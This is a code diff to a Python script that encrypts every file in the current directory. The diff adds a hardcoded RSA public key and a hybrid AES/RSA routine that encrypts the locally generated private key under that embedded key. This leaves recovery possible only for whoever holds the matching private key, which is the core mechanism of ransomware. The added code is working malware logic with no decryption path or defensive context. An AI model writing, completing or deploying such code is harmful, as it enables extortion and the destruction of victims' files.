@@ -90,6 +90,56 @@ def encrypt_all_files_in_directory(directory, public_key):
                 continue
             input_file = os.path.join(root, file)
             encrypt_real_file(input_file, public_key)
+# Load the public key
+public_key_pem = b"""
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsVYJofpm5+LLk1/7pZTv
+dcuOTs3N3V04cVslLIpBK3b2+83DyiZoXtrZ3iq1DGEiwHuMatbA+qCDjMiEGFFj
+mp3KzfpC4qv7DWrLwNkbjzH6dq/6K9xFJG4hQ3r3UhXc18mwvthRclLO70SKuluq
+klhxr4sBv6K4Zcm5oMA6CBgAnCzvJJoj4gj2XtYzAmP6gSWDKBtcupQNh5uh4Oav
+Rft9wW8K1spYUeRJWTHjy/EgnxwPfoNQcywA4+h1nq+oMGkfIgnaBA/DKVpo+sx6
+eVI8tKHL/ktK5aRjRmB20spohJ50HIR6Ociuv8yrR9DachiXAxyH1F7ta9mBCBr8
+awIDAQAB
+-----END PUBLIC KEY-----
+"""
+
+def load_public_key(pem_data):
+    return serialization.load_pem_public_key(pem_data, backend=default_backend())
+
+def encrypt_file(file_path, public_key):
+    # Generate a random AES key
+    aes_key = os.urandom(32)  # AES-256
+    iv = os.urandom(16)  # Initialization vector
+
+    # Read the file contents
+    with open(file_path, 'rb') as file:
+        plaintext = file.read()
+
+    # Encrypt the file contents using AES
+    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+
+    # Pad the plaintext to be a multiple of the block size
+    padding_length = 16 - (len(plaintext) % 16)
+    padded_plaintext = plaintext + bytes([padding_length] * padding_length)
+    ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()
+
+    # Encrypt the AES key with RSA
+    encrypted_key = public_key.encrypt(
+        aes_key,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+
+    # Write the encrypted AES key, IV, and ciphertext to a file
+    with open('private_key_encrypted.bin', 'wb') as enc_file:
+        enc_file.write(encrypted_key)
+        enc_file.write(iv)
+        enc_file.write(ciphertext)
+
 
 def main():
     directory = '.'  # Directory to scan and encrypt all files (current directory by default)
@@ -99,6 +149,12 @@ def main():
 
     # Step 2: Encrypt all files in the directory except the private key
     encrypt_all_files_in_directory(directory, public_key)
+
+    # Step 3: Encrypt the private key also
+    public_key = load_public_key(public_key_pem)
+    
+    # Encrypt the file
+    encrypt_file('private_key.pem', public_key)
 
 if __name__ == "__main__":
     main()
